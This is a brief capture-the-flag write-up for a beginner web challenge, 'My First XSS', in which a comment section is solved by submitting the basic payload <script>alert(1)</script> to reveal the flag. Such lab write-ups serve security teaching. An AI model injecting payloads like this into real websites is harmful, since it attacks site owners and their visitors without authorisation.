# Web

Challenge Name : My First XSS

# Solution

Opening the link will get us into this page

![](https://github.com/H0j3n/EzpzCTF/blob/main/src/Pasted%20image%2020210609145414.png)

There is a comment section. By giving a common XSS payload will get us the flag.

```bash
# Payload
<script>alert(1)</script>
```

# Flag

![](https://github.com/H0j3n/EzpzCTF/blob/main/src/Pasted%20image%2020210609145629.png)


